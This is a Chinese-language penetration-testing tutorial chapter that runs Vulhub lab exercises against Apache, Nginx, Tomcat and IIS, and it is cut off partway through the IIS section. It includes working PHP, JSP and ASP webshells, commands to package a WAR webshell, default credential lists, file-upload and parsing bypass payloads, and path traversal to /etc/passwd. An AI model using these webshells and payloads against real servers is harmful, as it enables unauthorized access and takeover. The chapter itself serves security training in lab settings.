# Day 38：中间件漏洞全家桶（Apache+Nginx+Tomcat+IIS+Weblogic+JBoss）

> **🎯 靶场实战** | 难度：⭐⭐⭐⭐ | 预计学习：120 分钟

---

# 第38章 中间件漏洞全家桶（六大中间件全覆盖）🏗️

## 开篇引入：大楼的消防通道没锁？🚪🔓

哈喽各位小伙伴！欢迎来到第38章！🎉

上一章我们学习了框架漏洞，知道了网站用的框架本身有漏洞的话，网站再努力加固也没用。今天这一章，我们来聊聊另一种"地基级"的漏洞——**中间件漏洞**。

什么是中间件呢？简单说，就是**运行网站的服务器软件**。你写的网站代码（PHP、Java、Python啥的），总得有个软件来"跑"它吧？这个跑代码的软件，就是中间件。

打个比方 🏬：
> 网站就像商场里的店铺，店铺装修得再豪华、门锁再高级，但是如果商场大楼本身有问题——比如消防通道没锁、电梯能随便进、地下室门大开着，那小偷根本不用撬你店铺的门，直接从大楼的漏洞就进去了！

中间件就是这个"商场大楼"。大楼本身有漏洞，跑在上面的网站再安全也白搭。这一章我们就来研究研究，这些"大楼"都有哪些经典的漏洞，我们又该怎么去发现和利用它们。

准备好了吗？让我们开始今天的"大楼探险"之旅！🚀

---

## 什么是中间件？🤔

### 大白话解释 🗣️

在正式讲漏洞之前，我们得先搞明白：到底啥是中间件？

用最直白的话说：

> **中间件就是"运行网站的软件"，它是网站代码和服务器硬件之间的"中间人"。**

你写了一堆PHP代码，放在那儿它自己不会跑，得有个软件来解析执行它，对吧？这个软件就是中间件。用户在浏览器里输入网址，请求先到中间件，中间件再去调用网站代码，然后把结果返回给用户。

再举个生活例子 🍔：
> 想象你去麦当劳点餐：
> - 你（用户）在柜台前点餐
> - 收银员（中间件）接收你的订单
> - 后厨（网站代码）按照订单做汉堡
> - 收银员（中间件）把做好的汉堡递给你
>
> 中间件就像这个收银员，它不做汉堡（不写业务逻辑），但所有的订单都要经过它。如果收银员脑子有问题，把你的订单理解错了，那后厨做出来的东西肯定也不对。

### 常见的中间件有哪些？📋

市面上常见的Web中间件主要有这几种：

#### 1. Apache 🌐

老牌Web服务器，江湖地位就像"丐帮"——历史悠久，门徒众多。Apache曾经是Web服务器界的绝对霸主，虽然现在用的人少了点，但依然有很多老网站在用。

特点：稳定、功能多、模块丰富，但是相对比较重。

#### 2. Nginx ⚡

后起之秀，轻量高性能的Web服务器。就像"闪电侠"，又快又灵活。现在新建的网站，十个有八个都用Nginx。

特点：轻量、高性能、并发能力强，常用来做反向代理和负载均衡。

#### 3. Tomcat 🐱

专门跑Java Web的服务器，相当于Java界的"专属跑道"。如果你的网站是用JSP、Servlet、Spring Boot这些Java技术写的，那大概率是跑在Tomcat上的。

特点：Java专属、功能完整、企业级应用用得多。

#### 4. IIS 🪟

微软家的Web服务器，Windows系统自带的，就像Windows的"亲儿子"。跑ASP、ASP.NET这些微软技术栈的网站常用它。

特点：和Windows深度集成、配置简单，但是只能在Windows上跑。经典漏洞有**解析漏洞**（`shell.asp;.jpg`）和**短文件名泄露**。

#### 5. Weblogic 🟧

Oracle家的Java EE应用服务器，企业级应用的"航母"。大型国企、银行、政府网站很多都用Weblogic，相当于Java界的"五星级酒店"——功能全面但体重量级巨大。

特点：企业级、功能完整、价格昂贵。漏洞非常多，而且多是**反序列化RCE**，实战中杀伤力极强。默认端口是 **7001**，控制台在 `/console`。

#### 6. JBoss 🟥（现在叫WildFly）

红帽家的开源Java应用服务器，相当于Java界的"商务酒店"——比Tomcat功能多，比Weblogic轻量。很多中大型企业用它。

特点：开源、Java EE功能完整、部署方便。经典漏洞有**后台WAR包部署**（和Tomcat类似）和**反序列化**。默认端口 **8080**，后台在 `/jmx-console` 或 `/admin-console`。

---

## 🧭 六大中间件速查思维导图

<svg width="800" height="360" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#eef5ff"/>
      <stop offset="100%" stop-color="#fff5ee"/>
    </linearGradient>
    <filter id="shadow" x="-10%" y="-10%" width="120%" height="120%">
      <feDropShadow dx="2" dy="3" stdDeviation="3" flood-opacity="0.18"/>
    </filter>
  </defs>
  <rect x="0" y="0" width="800" height="360" rx="18" fill="url(#bg)"/>
  <!-- 中心 -->
  <g filter="url(#shadow)">
    <rect x="310" y="140" width="180" height="70" rx="16" fill="#1f6feb"/>
    <text x="400" y="172" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold">Web 中间件</text>
    <text x="400" y="195" text-anchor="middle" fill="#e0efff" font-size="13">六大主流 · 地基级安全</text>
  </g>
  <!-- 左三 -->
  <g transform="translate(0,0)">
    <line x1="310" y1="175" x2="150" y2="70" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="40" y="40" width="130" height="55" rx="12" fill="#1d9bf0"/><text x="105" y="70" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">Apache 🌐</text><text x="105" y="88" text-anchor="middle" fill="#e6f4ff" font-size="11">解析漏洞 / 慢连接</text></g>
    <line x1="310" y1="175" x2="150" y2="180" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="40" y="150" width="130" height="55" rx="12" fill="#20b2aa"/><text x="105" y="180" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">Nginx ⚡</text><text x="105" y="198" text-anchor="middle" fill="#e6fffb" font-size="11">解析 / 目录穿越</text></g>
    <line x1="310" y1="175" x2="150" y2="295" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="40" y="265" width="130" height="55" rx="12" fill="#f59e0b"/><text x="105" y="295" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">Tomcat 🐱</text><text x="105" y="313" text-anchor="middle" fill="#fff5e6" font-size="11">弱口令 / WAR / Ghostcat</text></g>
  </g>
  <!-- 右三 -->
  <g transform="translate(0,0)">
    <line x1="490" y1="175" x2="650" y2="70" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="630" y="40" width="130" height="55" rx="12" fill="#7c3aed"/><text x="695" y="70" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">IIS 🪟</text><text x="695" y="88" text-anchor="middle" fill="#ede9fe" font-size="11">解析 / 短文件名</text></g>
    <line x1="490" y1="175" x2="650" y2="180" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="630" y="150" width="130" height="55" rx="12" fill="#dc2626"/><text x="695" y="180" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">Weblogic 🟧</text><text x="695" y="198" text-anchor="middle" fill="#fee2e2" font-size="11">反序列化 RCE</text></g>
    <line x1="490" y1="175" x2="650" y2="295" stroke="#888" stroke-width="2"/>
    <g filter="url(#shadow)"><rect x="630" y="265" width="130" height="55" rx="12" fill="#9333ea"/><text x="695" y="295" text-anchor="middle" fill="#fff" font-size="16" font-weight="bold">JBoss 🟥</text><text x="695" y="313" text-anchor="middle" fill="#f5e9ff" font-size="11">WAR部署 / 反序列化</text></g>
  </g>
</svg>

### 为什么中间件漏洞很危险？⚠️

可能有人会问："网站代码写好点不就行了吗？中间件能有啥漏洞？"

哎，这你就不懂了。中间件漏洞的可怕之处在于：

1. **影响范围广**：一个中间件漏洞，可能影响成千上万的网站。就像一栋大楼有问题，里面所有店铺都遭殃。
2. **位置底层**：中间件在网站代码的"下面"，一旦被攻破，直接就能拿到服务器权限，网站代码再安全也没用。
3. **利用简单**：很多中间件漏洞利用起来特别简单，甚至只需要访问一个特殊的URL就行。

举个夸张的例子 🏢：
> 你买了一套房子，装了高级防盗门、指纹锁、监控摄像头，觉得安全得不得了。结果呢，这栋楼的电梯是坏的，任何人坐电梯都能直接到你家门口，而且你家卧室墙上还有个通往楼道的大洞……
>
> 中间件漏洞，就是这种"地基级"的问题。

好，概念讲完了，下面我们来挨个看看这几个主流中间件都有哪些经典漏洞，以及怎么去复现它们！

---

## Apache中间件漏洞 🦅

### Apache解析漏洞——后缀名的"近视眼"👓

第一个要讲的，就是Apache最经典的漏洞之一：**解析漏洞**。

#### 什么是解析漏洞？🤷‍♂️

啥叫解析漏洞呢？简单说就是——**Apache认文件后缀名的方式有问题**。

我们都知道，一个文件叫 `shell.php`，Apache会把它当成PHP文件来执行。那如果文件名是 `shell.php.jpg` 呢？

正常人都会觉得："后缀是.jpg啊，那肯定是图片嘛！"

但是Apache不这么想……Apache有个"近视眼"的毛病，它是**从右往左**找后缀名的，遇到不认识的后缀就跳过，一直找到它认识的为止。

啥意思呢？举个例子：

文件名：`shell.php.jpg`

Apache的"思考过程" 🤔：
1. 从右往左看，第一个后缀是 `.jpg`
2. `.jpg`？不认识，跳过
3. 继续往左，第二个后缀是 `.php`
4. `.php`！认识！就按PHP文件执行！

于是，一个看起来是图片的 `.jpg` 文件，就被Apache当成PHP代码执行了……😱

这就像什么呢？举个生活例子 📛：
> 学校门口保安查学生证，要求必须是本校学生才能进。保安有个毛病，看名字从右往左看，不认识的字自动跳过。
>
> 有个学生叫"王小明"，正常能进。后来来了个外校的，名字叫"王小明·隔壁学校"。保安从右往左看："隔壁学校"？不认识，跳过。"王小明"！认识！放行！
>
> 于是外校的就这么混进去了……

在这里：
- 保安 = Apache
- 王小明 = .php后缀（合法的）
- 隔壁学校 = .jpg后缀（用来伪装的）

#### 漏洞原理详解 🔍

Apache的这个解析漏洞，本质上是因为它的**多后缀文件解析机制**。

Apache有个配置叫 `AddType`，用来指定什么后缀的文件用什么处理器。比如：

```apache
AddType application/x-httpd-php .php
```

这句话的意思是：后缀是 `.php` 的文件，用PHP来解析。

但是问题来了——Apache对于多后缀名的文件，是**从右往左匹配**的，只要有一个后缀匹配上了，就按那个来。

而且Apache还有个特点：**它不认识的后缀名，会直接忽略**，就当那个后缀不存在。

所以 `shell.php.jpg` 这个文件：
- `.jpg` 后缀 → 不认识 → 忽略
- `.php` 后缀 → 认识 → 按PHP执行

这就导致了解析漏洞的产生。

#### 漏洞环境搭建 🛠️

这个漏洞我们用Vulhub来复现。如果你还没装Vulhub，赶紧去翻前面的章节，把Docker和Vulhub装好，我们后面的漏洞复现全靠它！

Vulhub里有专门的Apache解析漏洞环境，路径是：`httpd/apache_parsing_vulnerability/`

启动环境的步骤很简单：

```bash
# 进入vulhub目录
cd /root/vulhub

# 进入Apache解析漏洞目录
cd httpd/apache_parsing_vulnerability

# 启动环境
docker-compose up -d
```

启动成功后，访问 `http://你的IP:端口` 就能看到靶场页面了。具体端口号看 `docker-compose.yml` 文件，一般是80端口。

#### 复现步骤 📝

好，环境搭好了，我们来一步步复现这个漏洞！

**第一步：准备图片马** 🖼️

首先我们需要一个"图片马"——就是在图片文件里植入PHP代码。关于图片马的制作，我们在文件上传那章已经讲过了，忘了的小伙伴可以回去复习一下。

最简单的图片马制作方法：

```bash
# 找一张正常的图片 1.jpg，再准备一个一句话木马 shell.php
# 然后用 copy 命令把它们合在一起
copy 1.jpg/b + shell.php/a shell.php.jpg
```

或者直接用一句话：

```php
GIF89a<?php phpinfo(); ?>
```

把这句话保存成 `shell.php.jpg` 也行。

**第二步：上传图片马** 📤

靶场页面一般会有个文件上传的地方，我们把刚才做好的 `shell.php.jpg` 传上去。

上传成功后，会告诉你文件的路径，比如 `/upload/shell.php.jpg`。

**第三步：访问文件，见证奇迹！** ✨

现在，在浏览器里访问这个上传的文件：

```
http://你的IP/upload/shell.php.jpg
```

你猜会发生什么？

你会看到——**phpinfo()的页面出来了！** 🎉

明明是个.jpg后缀的文件，结果PHP代码被执行了！这就是Apache解析漏洞的威力。

**第四步：getshell** 🔓

既然phpinfo能执行，那我们换个一句话木马，不就能直接拿Shell了吗？

把图片马里的内容改成：

```php
GIF89a<?php @eval($_POST['cmd']); ?>
```

然后上传，再用中国菜刀或者蚁剑连接这个图片地址，就能直接拿到服务器控制权了！

#### 漏洞危害有多大？💥

这个漏洞的危害，配合文件上传漏洞简直是"王炸组合" 💣：

1. 网站可能有文件上传功能，但只允许传图片（检查后缀）
2. 你传个 `shell.php.jpg`，网站一看后缀是.jpg，放行
3. 结果Apache把它当成PHP执行了
4. 直接getshell，服务器沦陷

就像什么呢？举个例子 🏊：
> 游泳馆规定：只有穿泳衣的人才能下水。门口保安检查，一看你穿了泳衣，就让你进了。但是保安不知道——你泳衣里面还穿了一套潜水服，带着氧气瓶，直接就能潜进游泳池底的控制室，把整个游泳馆的控制权拿走了……

#### 影响版本 📊

这个解析漏洞主要影响 **Apache 1.x 和 Apache 2.x** 的某些版本，特别是当配置不当的时候。

现在新版本的Apache默认配置已经修复了这个问题，但如果管理员配置不当，还是可能出问题。

---

### Apache其他漏洞简单介绍 📚

除了解析漏洞，Apache还有一些其他常见漏洞，我们简单了解一下，有个概念就行。

#### 1. 目录遍历漏洞 📂

什么是目录遍历？简单说就是——**通过特殊的URL，你能看到网站目录里的所有文件和文件夹**。

比如正常你访问 `http://example.com/img/`，应该返回403禁止访问，或者显示默认页面。但如果配置不当，访问这个路径会直接列出 `img` 目录下的所有文件，就像打开了文件夹一样。

这就危险了，比如你可能看到：
- 备份文件：`www.zip`、`backup.sql`
- 配置文件：`config.php.bak`
- 甚至是源代码文件

就像你去别人家，本来只能在客厅待着，结果你一推卧室门，门没锁，里面啥都能看见……🚪

#### 2. 慢连接攻击（Slowloris）🐢

这是一种拒绝服务攻击（DoS）。简单说就是：攻击者和Apache建立连接，但是慢慢悠悠地发数据，半天发不完一个请求。

Apache有个特点，每个连接都要开一个线程或进程来处理。如果攻击者建立了很多很多这种"慢连接"，把Apache的连接都占满了，正常用户的请求就处理不了了。

这就像什么呢？举个例子 🏪：
> 一家奶茶店，只有5个收银台。来了5个人，每个人站在柜台前，5分钟点一杯奶茶，点完了又想5分钟，一直占着收银台。后面来的顾客根本没法点单，店就相当于瘫痪了。

慢连接攻击就是这个道理——用很少的资源，就能把服务器的连接占满。

好，Apache我们就先讲到这儿，下面来看看现在最火的Web服务器——Nginx！

---

## Nginx中间件漏洞 🚀

### Nginx解析漏洞——URL里的"小把戏"🎭

Nginx也有解析漏洞？没错！不过Nginx的解析漏洞和Apache的不太一样，它不是后缀名的问题，而是**URL路径的问题**。

#### 什么是Nginx解析漏洞？🤷‍♀️

先问大家一个问题：

如果有个文件叫 `shell.jpg`，你访问 `http://example.com/shell.jpg`，它是图片，没问题。

那如果访问 `http://example.com/shell.jpg/.php` 呢？

注意看，文件名后面多了个 `/.php`！这时候会发生什么？

正常人肯定想："shell.jpg是图片，后面加/.php是什么鬼？应该404报错吧？"

但是！在某些配置下，Nginx会**把shell.jpg当成PHP文件来执行**！😱

啥？这是什么操作？一个图片文件，怎么就变成PHP了？

别急，听我慢慢给你解释。

#### 漏洞原理详解 🔍

这个漏洞的本质是：**Nginx的配置不当 + PHP的cgi.fix_pathinfo配置**。

我们先来讲讲Nginx是怎么处理PHP请求的。

通常Nginx的配置长这样：

```nginx
location ~ \.php$ {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
}
```

这段配置的意思是：**只要URL是以.php结尾的，就交给PHP去处理**。

现在问题来了——当你访问 `/shell.jpg/.php` 的时候：

1. Nginx一看，URL是以 `.php` 结尾的，于是就交给PHP处理 ✅
2. PHP收到请求，要知道执行哪个文件啊，于是看 `SCRIPT_FILENAME`
3. `SCRIPT_FILENAME` 是 `/var/www/html/shell.jpg/.php`
4. PHP一看，`/shell.jpg/.php` 这个文件不存在啊……
5. 这时候，PHP的 `cgi.fix_pathinfo` 配置起作用了！
6. PHP会"智能"地往前找：`.php` 不存在？那前面的 `shell.jpg` 存不存在？
7. `shell.jpg` 存在！那就执行 `shell.jpg` 这个文件！
8. 于是，图片马就被当成PHP执行了……

这就像什么呢？举个生活例子 📮：
> 你去快递站取快递，报名字叫"张三·不存在"。
> 快递员找了半天，没找到叫"张三·不存在"的快递。
> 但是快递员很"聪明"，他想："会不会是名字写错了？我找找有没有叫'张三'的。"
> 哎，还真有个叫"张三"的快递！于是就把"张三"的快递给你了。

在这里：
- 快递员 = PHP
- 张三·不存在 = /shell.jpg/.php（不存在的文件）
- 张三 = shell.jpg（实际存在的文件）
- cgi.fix_pathinfo = 快递员的"聪明"机制

#### 漏洞环境搭建 🛠️

还是用Vulhub，Nginx解析漏洞的环境路径是：`nginx/nginx_parsing_vulnerability/`

启动步骤：

```bash
# 进入vulhub目录
cd /root/vulhub

# 进入Nginx解析漏洞目录
cd nginx/nginx_parsing_vulnerability

# 启动环境
docker-compose up -d
```

启动完成后，访问 `http://你的IP` 就能看到靶场了。

#### 复现步骤 📝

好，环境搭好了，我们来复现！

**第一步：上传图片马** 🖼️

和之前一样，准备一个图片马 `shell.jpg`，内容可以是：

```php
GIF89a<?php phpinfo(); ?>
```

靶场有上传点，直接上传这个图片。上传成功后，记下文件路径，比如 `/uploadfiles/shell.jpg`。

**第二步：直接访问图片** 👀

先直接访问图片看看：

```
http://你的IP/uploadfiles/shell.jpg
```

你会看到——就是一张正常的图片（或者是乱码，因为我们写的是phpinfo），反正PHP代码没有执行。

**第三步：加上/.php，见证奇迹！** ✨

现在，在URL后面加上 `/.php`，变成：

```
http://你的IP/uploadfiles/shell.jpg/.php
```

回车！

哇！phpinfo()页面出来了！🎉

一个.jpg的图片文件，就这么被当成PHP执行了！是不是很神奇？

**第四步：getshell** 🔓

和Apache解析漏洞一样，把图片马里的phpinfo换成一句话木马：

```php
GIF89a<?php @eval($_POST['cmd']); ?>
```

上传后，访问 `shell.jpg/.php`，然后用菜刀或蚁剑连接，直接拿Shell！

#### 漏洞危害 💥

这个漏洞的危害和Apache解析漏洞差不多，也是配合文件上传漏洞getshell的"神器"。

而且Nginx现在用得特别多，所以这个漏洞的实战价值也很高。

---

### Nginx目录穿越/文件读取 📂

Nginx还有一个经典漏洞，叫**目录穿越**，也叫**路径穿越**。

#### 什么是目录穿越？🤔

简单说就是：**通过构造特殊的URL，你能读到网站目录之外的文件**。

举个例子，网站配置了 `/files/` 路径指向 `/home/www/files/` 目录。正常情况下，你访问 `/files/1.txt`，读到的是 `/home/www/files/1.txt`。

但是如果配置不当，你访问 `/files../etc/passwd`，可能就能读到 `/etc/passwd` 这个系统文件！

因为 `../` 在Linux里是"上一级目录"的意思，所以：
- `/files/../etc/passwd`
- 就等于 `/home/www/files/../etc/passwd`
- 就等于 `/home/www/etc/passwd`（不对，还得看具体配置）

哦不对，更准确的例子是这样的：

如果Nginx配置了：

```nginx
location /files/ {
    alias /home/;
}
```

这时候访问 `/files../etc/passwd`，就变成了 `/home/../etc/passwd`，也就是 `/etc/passwd`！

这就像什么呢？举个生活例子 🏠：
> 小区物业规定，业主只能在自家花园活动，花园在房子的南面。花园门口有个保安，只允许去花园的人进。
>
> 结果你跟保安说："我去花园……北边的那个储藏室。"
> 保安一听，"花园"俩字有了，就放你进去了。结果你进了花园门，直接往北走，绕过房子，去了储藏室……

保安只检查有没有"花园"两个字，不管你后面往哪走，这就是漏洞所在。

#### 能读到什么文件？📄

如果存在目录穿越漏洞，攻击者能读到很多敏感文件，比如：

- `/etc/passwd` —— 系统用户信息
- `/etc/shadow` —— 用户密码哈希（如果权限够的话）
- 网站配置文件 —— 数据库密码啥的
- 源代码文件 —— 审计漏洞
- SSH密钥 —— 直接登录服务器

危害也是相当大的！

---

### Nginx其他漏洞简单介绍 📚

#### 1. Nginx状态页未授权访问 📊

Nginx有个模块叫 `stub_status`，用来显示Nginx的运行状态，比如当前连接数、请求数啥的。

如果这个状态页没有做访问控制，任何人都能访问，那攻击者就能通过它了解服务器的一些信息，比如访问量、并发数之类的，为后续攻击做准备。

就像你家大门上有个显示屏，显示你家里现在有几个人、今天来了多少客人，任何人路过都能看……虽然不是直接被攻破，但信息泄露也是安全隐患。

#### 2. Nginx版本信息泄露 🏷️

默认情况下，Nginx的错误页面和响应头里会显示具体的版本号，比如 `nginx/1.18.0`。

攻击者知道了具体版本，就能去查这个版本有没有已知的漏洞，然后针对性地攻击。

就像你把你家防盗门的品牌型号直接写在门上，小偷一看，哦，这个型号的锁我知道怎么开，那就简单了。

好，Nginx我们就讲这么多，下面来看看Java界的扛把子——Tomcat！

---

## Tomcat中间件漏洞 🐱

### Tomcat是什么？🤔

在讲漏洞之前，先简单介绍一下Tomcat。

Tomcat是**Apache软件基金会**的一个项目，是专门用来运行Java Web应用的服务器。如果你的网站是用Java写的（比如JSP、Servlet、Spring MVC啥的），那大概率是跑在Tomcat上的。

你可以把Tomcat理解成Java Web的"专属跑道"——别的飞机（PHP、Python）它不拉，只拉Java的飞机。

Tomcat有个很重要的东西，叫**WAR包**。啥是WAR包？简单说就是Java Web应用的部署包，就像一个zip压缩包，把整个网站的代码、配置、资源文件都打包在一起，部署的时候直接把WAR包扔到Tomcat里，它就自动解压运行了。

这就像什么呢？举个例子 📦：
> 你要搬家，把所有东西都打包进一个大箱子，贴个标签"家当"。到了新家，直接把这个箱子往屋里一放，打开就能用了。
> WAR包就是这个"大箱子"，里面装着整个Java Web应用。

好，概念有了，我们来看Tomcat最经典的漏洞之一——**弱口令+后台WAR包部署getshell**。

---

### Tomcat弱口令+后台WAR包部署 🔑

#### 什么是管理后台？🎛️

Tomcat自带了一个**管理后台**，叫 **Manager App**，地址一般是 `/manager/html`。

这个后台是干嘛的呢？简单说就是给管理员用的，可以：
- 查看当前部署了哪些应用
- 启动、停止、卸载应用
- **上传WAR包部署新应用**

哎，看到最后一条了吗？**上传WAR包部署新应用**！

如果我们能登录这个后台，然后上传一个里面装了webshell的WAR包，部署之后直接访问，不就拿到Shell了吗？😏

那怎么登录后台呢？答案是——**弱口令**！

很多管理员图省事，给Tomcat管理后台设置的密码特别简单，比如：
- tomcat / tomcat
- admin / admin
- manager / manager
- tomcat / s3cret

甚至还有空密码的……

这就像什么呢？举个生活例子 🏢：
> 写字楼的物业办公室门没锁，里面有个控制台，可以控制整栋楼的电梯、门禁、监控，还能在任意楼层开新房间。
> 你只要猜对了物业办公室的密码，进去之后，想开多少房间开多少房间，想装什么装什么……
>
> Tomcat管理后台就是这个"物业办公室"，弱口令就是"门没锁"。

#### 漏洞环境搭建 🛠️

还是用Vulhub，Tomcat弱口令的环境路径是：`tomcat/tomcat8/` 或者 `tomcat/tomcat7/`

我们用Tomcat 8来演示：

```bash
# 进入vulhub目录
cd /root/vulhub

# 进入Tomcat8目录
cd tomcat/tomcat8

# 启动环境
docker-compose up -d
```

启动完成后，访问 `http://你的IP:8080` 就能看到Tomcat的默认页面了。

Vulhub里的Tomcat环境一般都自带弱口令，用户名密码通常是 `tomcat / tomcat`。

#### 复现步骤 📝

好，环境搭好了，我们一步步来！

**第一步：访问管理后台** 🌐

在浏览器里访问：

```
http://你的IP:8080/manager/html
```

这时候会弹出一个登录框，让你输入用户名和密码。

**第二步：用弱口令登录** 🔐

输入用户名 `tomcat`，密码 `tomcat`，点击登录。

如果登录成功，你就进入了Tomcat的管理后台！🎉

后台页面能看到：
- 当前部署的应用列表
- 每个应用的状态（运行中/已停止）
- 可以进行的操作（启动、停止、重载、卸载）
- 页面下方有个 **WAR file to deploy** 的区域

**第三步：制作WAR包webshell** 📦

现在我们需要制作一个WAR包，里面装一个JSP的一句话木马。

怎么制作WAR包呢？很简单，因为WAR包本质上就是个zip文件，我们用jar命令或者直接用zip压缩都行。

首先，准备一个JSP一句话木马，文件名比如叫 `shell.jsp`，内容是：

```jsp
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%
    if(request.getParameter("cmd")!=null){
        Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os=p.getOutputStream();
        InputStream in=p.getInputStream();
        InputStreamReader inr=new InputStreamReader(in);
        BufferedReader br=new BufferedReader(inr);
        String line;
        while((line=br.readLine())!=null){
            out.println(line);
        }
    }
%>
```

这是一个简单的命令执行的JSP木马，通过 `?cmd=命令` 来执行系统命令。

然后，把这个JSP文件打包成WAR包。在Kali里执行：

```bash
# 方法一：用jar命令（推荐，正宗的Java打包方式）
jar -cvf shell.war shell.jsp

# 方法二：用zip命令也行
zip shell.war shell.jsp
```

执行完之后，当前目录下就会生成一个 `shell.war` 文件。

**第四步：上传WAR包部署** 📤

回到Tomcat管理后台，找到 **WAR file to deploy** 那个区域，点击"选择文件"，选择我们刚才做好的 `shell.war`，然后点击 **Deploy** 按钮。

上传部署成功后，你会在应用列表里看到一个叫 `/shell` 的新应用，状态是"running"（运行中）。

**第五步：访问webshell，拿Shell！** 🔓

现在，在浏览器里访问：

```
http://你的IP:8080/shell/shell.jsp?cmd=id
```

注意路径：WAR包叫 `shell.war`，解压后就是 `/shell/` 目录，里面的 `shell.jsp` 就是我们的木马。

如果能看到 `uid=... gid=...` 之类的输出，说明命令执行成功了！🎉

接下来，你就可以：
- 执行 `ls` 看看目录
- 执行 `cat /etc/passwd` 看用户
- 执行 `wget` 下载更多工具
- 甚至反弹一个Shell回来

就这样，通过Tomcat弱口令+WAR包部署，我们轻轻松松就拿到了服务器的控制权！

#### 漏洞危害有多大？💥

这个漏洞的危害简直是"核弹级"的 💣：

1. **直接getshell**：只要能登录后台，上传WAR包，直接就能执行任意代码
2. **利用简单**：操作全是图形界面，点几下鼠标就搞定了
3. **影响广泛**：很多企业的Java应用都跑在Tomcat上，而且很多管理员不注意加固

就像什么呢？举个例子 🏰：
> 你攻打一座城堡，本来以为要架云梯、撞城门，打个三天三夜。结果走到城门口一看，城门大开，守门的士兵在睡觉，城墙上还挂着个牌子："欢迎参观，钥匙就在门垫下面"……
>
> 你拿了钥匙，直接就进了城堡，想干嘛干嘛。

---

### Tomcat其他漏洞简单介绍 📚

Tomcat的漏洞还有很多，我们简单了解几个有名的，有个概念就行。

#### 1. Tomcat PUT方法上传（CVE-2017-12615）📥

这个漏洞是说：当Tomcat开启了PUT方法的时候，攻击者可以直接通过PUT请求上传JSP文件到服务器，然后访问执行，直接getshell。

啥意思呢？就是不用登录后台，直接往服务器上扔文件！扔完了访问就完事了。

这个漏洞的编号是 **CVE-2017-12615**，影响Tomcat 7.0.0到7.0.79的版本。

就像快递柜不仅不用检查包裹，任何人都能直接往你柜子里放东西，放完了还能直接让包裹里的东西跑出来……

#### 2. Tomcat反序列化漏洞 🍪

Java的反序列化漏洞是个"老生常谈"的话题了，Tomcat在某些情况下也存在反序列化漏洞。

简单说就是：攻击者构造一个恶意的序列化数据，发给Tomcat，Tomcat反序列化这个数据的时候，就会执行里面的恶意代码，从而getshell。

反序列化漏洞比较复杂，新手暂时不用深究，知道有这么个东西就行。

#### 3. Ghostcat（幽灵猫）漏洞 👻

这个漏洞的编号是 **CVE-2020-1938**，是Tomcat的AJP协议的漏洞。

啥是AJP协议？简单说就是Tomcat和前端Web服务器（比如Apache、Nginx）通信的协议，端口一般是8009。

这个漏洞可以让攻击者读取Tomcat下的任意文件，甚至在某些情况下可以执行代码。因为影响范围广（几乎所有Tomcat版本都受影响），而且危害大，所以被叫做"幽灵猫"。

好，Tomcat我们就讲这么多。接下来我们进入Windows阵营的霸主——IIS，以及两大Java企业级巨兽Weblogic和JBoss！这三个在真实护网、红队行动中出现的频率可一点都不低，甚至更高哦！

---

## IIS 中间件漏洞 🪟

### 什么是IIS？🏢

IIS（Internet Information Services）是微软家的Web服务器，**只能跑在Windows系统上**，和Windows深度绑定，就像Windows的"亲儿子"。

如果你遇到的网站：
- 后缀是 `.asp` 或 `.aspx`
- 服务器响应头里有 `Microsoft-IIS/xx.x`
- 用的是SQL Server数据库（MSSQL）
- 错误页面是蓝色/白色的ASP.NET报错页

那99%就是跑在IIS上！

IIS在国企、政府、传统行业非常常见，因为他们的IT系统基本都是Windows+SQL Server全家桶。所以IIS的漏洞在实战中价值极高！

IIS的版本和Windows版本对应关系：
| IIS版本 | Windows版本 |
|---------|------------|
| IIS 6.0 | Windows Server 2003 |
| IIS 7.0 | Windows Server 2008 |
| IIS 7.5 | Windows 7 / 2008 R2 |
| IIS 8.0 | Windows 8 / 2012 |
| IIS 8.5 | Windows 8.1 / 2012 R2 |
| IIS 10.0 | Windows 10/11 / 2016/2019/2022 |

---

### IIS 6.0 解析漏洞——分号";"的魔法 💫

这是IIS最经典的漏洞，虽然是老漏洞，但实战中经常遇到（很多老系统还在用Windows Server 2003）。

#### 漏洞原理 🔍

IIS 6.0在解析文件名的时候，有一个非常离谱的Bug：**遇到分号 `;` 之后的部分，会直接截断忽略！**

啥意思？举个例子：

文件名：`shell.asp;.jpg`

正常人的理解：这是个jpg图片，后缀是`.jpg`

IIS 6.0的理解：
1. 看到 `shell.asp`
2. 看到分号 `;`，分号后面的东西我不要了！❌
3. 所以文件名叫 `shell.asp`，是ASP文件，执行！🚀

于是，一个看起来是jpg图片的文件，就被IIS当成ASP木马执行了……

这就像什么呢？举个生活例子 🎫：
> 你去电影院看电影，买了一张《黑客帝国》的票，票上写着："黑客帝国;送爆米花"。
>
> 检票员看了一眼票，看到分号，心想："分号后面的是赠品信息，不用看。"于是只看了前面"黑客帝国"四个字，就让你进去了。
>
> 结果你其实买的是"黑客帝国送爆米花"这五个字拼成的假票，但检票员根本没看后面……

#### 漏洞复现环境 🛠️

这个漏洞需要IIS 6.0 + Windows Server 2003，用Vulhub不太方便（需要Windows虚拟机）。新手可以：
1. 用VMware装一个Windows Server 2003虚拟机
2. 开启IIS 6.0（控制面板→添加删除程序→Windows组件→应用程序服务器→IIS）
3. 新建网站，目录设为 `C:\inetpub\wwwroot`

或者直接记原理也行，实战遇到老系统第一个想到这个！

#### 复现步骤 📝

**第一步：制作图片马** 🖼️

准备一个文件，内容是ASP一句话木马：
```asp
<%eval request("cmd")%>
```

保存的时候，**文件名一定要是 `shell.asp;.jpg`**（注意分号！）

**第二步：上传文件** 📤

找到网站的文件上传点，把这个 `shell.asp;.jpg` 传上去。

